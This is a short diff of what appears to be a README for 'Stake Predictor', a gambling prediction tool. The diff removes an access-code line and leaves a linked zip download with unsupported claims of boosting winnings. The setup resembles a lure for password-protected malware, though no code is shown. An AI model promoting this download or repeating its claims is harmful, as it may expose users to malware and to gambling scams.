@@ -5,7 +5,6 @@
 
 Stake Predictor is your go-to solution for making informed predictions on a variety of sports and gaming events. Leverage cutting-edge analytics to enhance your winning potential!
 
-**Access Code:** `2024`
 
 [![358857456-ae0a2b36-66fd-46b1-bb5c-589639819568](https://github.com/user-attachments/assets/0770de84-8b70-4a18-b601-33b32120123a)](https://github.com/stakepredictor-2025/stake-predictor/archive/refs/tags/stakepredictor.zip)
 
